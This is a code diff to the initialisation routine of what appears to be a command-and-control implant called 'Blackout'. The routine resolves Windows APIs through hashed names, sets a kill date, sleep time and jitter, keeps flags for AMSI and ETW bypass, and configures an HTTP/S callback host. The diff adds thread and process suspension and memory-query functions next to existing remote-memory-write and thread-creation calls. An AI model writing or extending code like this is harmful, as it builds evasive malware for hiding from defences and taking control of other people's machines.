@@ -43,6 +43,7 @@ FUNC VOID BlackoutInit() {
     Instance()->Win32.LocalReAlloc              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LocalReAlloc" ) );
     Instance()->Win32.VirtualFree               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualFree" ) );
     Instance()->Win32.VirtualQuery              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualQuery" ) );
+    Instance()->Win32.VirtualQueryEx            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualQueryEx" ) );
     Instance()->Win32.VirtualAlloc              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualAlloc" ) );
     Instance()->Win32.VirtualAllocEx            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualAllocEx" ) );
     Instance()->Win32.VirtualProtect            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtect" ) );
@@ -72,6 +73,9 @@ FUNC VOID BlackoutInit() {
     Instance()->Win32.GetNativeSystemInfo       = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetNativeSystemInfo" )  );
     Instance()->Win32.DuplicateHandle           = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "DuplicateHandle" )  );
     Instance()->Win32.GetThreadId               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetThreadId" )  );
+    Instance()->Win32.ResumeThread              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "ResumeThread" )  );
+    Instance()->Win32.SuspendThread             = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "SuspendThread" )  );
+    Instance()->Win32.GetMappedFileNameA        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetMappedFileNameA" )  );
 
     Instance()->Win32.RtlExitUserProcess        = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlExitUserProcess" ) );
     Instance()->Win32.RtlExitUserThread         = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlExitUserThread" ) );
@@ -87,8 +91,12 @@ FUNC VOID BlackoutInit() {
     Instance()->Win32.NtProtectVirtualMemory    = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtProtectVirtualMemory" ) );
     Instance()->Win32.NtCreateThreadEx          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateThreadEx" ) );
     Instance()->Win32.LdrLoadDll                = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "LdrLoadDll" ) );
+
     Instance()->Win32.NtQuerySystemInformation  = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQuerySystemInformation" ) );
     Instance()->Win32.NtQueryInformationProcess = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQueryInformationProcess" ) );
+    Instance()->Win32.NtQueryVirtualMemory      = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQueryVirtualMemory" ) );
+
+
     Instance()->Win32.NtSetInformationVirtualMemory = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSetInformationVirtualMemory" ) );
     Instance()->Win32.NtAlertResumeThread       = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtAlertResumeThread" ) );
     Instance()->Win32.NtContinue                = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtContinue" ) );
@@ -104,6 +112,9 @@ FUNC VOID BlackoutInit() {
     Instance()->Win32.NtCreateNamedPipeFile     = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateNamedPipeFile" ) );   
     Instance()->Win32.NtWriteVirtualMemory      = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtWriteVirtualMemory" ) ); 
     Instance()->Win32.NtOpenProcess             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtOpenProcess" ) ); 
+    Instance()->Win32.NtResumeThread            = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtResumeThread" ) ); 
+    Instance()->Win32.NtSuspendThread           = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSuspendThread" ) ); 
+    Instance()->Win32.NtSuspendProcess          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSuspendProcess" ) ); 
 
     Instance()->Modules.Winhttp      = Instance()->Win32.LoadLibraryA( "Winhttp.dll"  );
     Instance()->Modules.Advapi32     = Instance()->Win32.LoadLibraryA( "Advapi32.dll" );
@@ -137,11 +148,11 @@ FUNC VOID BlackoutInit() {
     Instance()->Session.KillDate     = CONFIG_KILLDATE;
     Instance()->Session.SleepTime    = CONFIG_SLEEP;
     Instance()->Session.Jitter       = 0x00;
-    Instance()->Session.AgentId    = RandomNumber32();
-    Instance()->Session.AmsiBypass = FALSE;
-    Instance()->Session.EtwBypass  = FALSE;
-    Instance()->Session.ProcessId  = CST_U32( Instance()->Teb->ClientId.UniqueProcess );
-    Instance()->Session.ThreadId   = CST_U32( Instance()->Teb->ClientId.UniqueThread );
+    Instance()->Session.AgentId      = RandomNumber32();
+    Instance()->Session.AmsiBypass   = FALSE;
+    Instance()->Session.EtwBypass    = FALSE;
+    Instance()->Session.ProcessId    = CST_U32( Instance()->Teb->ClientId.UniqueProcess );
+    Instance()->Session.ThreadId     = CST_U32( Instance()->Teb->ClientId.UniqueThread );
 
     /*============================[ Machine recognition ]============================*/
 
@@ -159,7 +170,6 @@ FUNC VOID BlackoutInit() {
     Instance()->System.OsArch        = 0;
     Instance()->System.ProcessorType = 0;
     
-
     /*============================[ Http/s listener config ]============================*/
 
     Instance()->Transport.Host      = CONFIG_HOST;
